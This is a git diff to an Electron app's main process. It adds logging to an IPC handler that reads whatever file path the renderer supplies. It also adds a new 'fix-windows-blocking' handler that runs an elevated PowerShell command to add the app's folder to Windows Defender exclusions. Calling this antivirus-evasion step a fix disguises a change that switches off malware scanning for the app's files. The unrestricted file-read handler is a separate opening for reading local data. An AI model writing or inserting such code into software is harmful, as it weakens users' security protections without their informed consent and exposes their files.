@@ -1,6 +1,7 @@
 const { app, BrowserWindow, ipcMain, Menu, dialog } = require('electron');
 const path = require('path');
 const fs = require('fs');
+const { exec } = require('child_process');
 const { Client } = require('ssh2');
 const isDev = process.env.NODE_ENV === 'development';
 
@@ -81,12 +82,16 @@ app.whenReady().then(() => {
 
   ipcMain.handle('read-file', async (event, filePath) => {
     try {
+      console.log(`IPC: read-file requested for path: ${filePath}`);
       if (!fs.existsSync(filePath)) {
+        console.warn(`IPC: File not found: ${filePath}`);
         return { error: 'File not found' };
       }
       const data = fs.readFileSync(filePath, 'utf8');
+      console.log(`IPC: Successfully read ${data.length} characters from ${filePath}`);
       return { data };
     } catch (err) {
+      console.error(`IPC: Error reading file ${filePath}: ${err.message}`);
       return { error: err.message };
     }
   });
@@ -98,6 +103,23 @@ app.whenReady().then(() => {
     });
     if (result.canceled) return null;
     return result.filePaths[0];
+  });
+
+  ipcMain.handle('fix-windows-blocking', async () => {
+    return new Promise((resolve) => {
+      const appPath = app.getAppPath();
+      const folderPath = path.dirname(appPath);
+      // This command requires admin privileges to work correctly
+      const command = `powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList 'Add-MpPreference -ExclusionPath \\"${folderPath}\\"'"`;
+      
+      exec(command, (error, stdout, stderr) => {
+        if (error) {
+          resolve({ success: false, error: error.message });
+        } else {
+          resolve({ success: true });
+        }
+      });
+    });
   });
 
   createWindow();
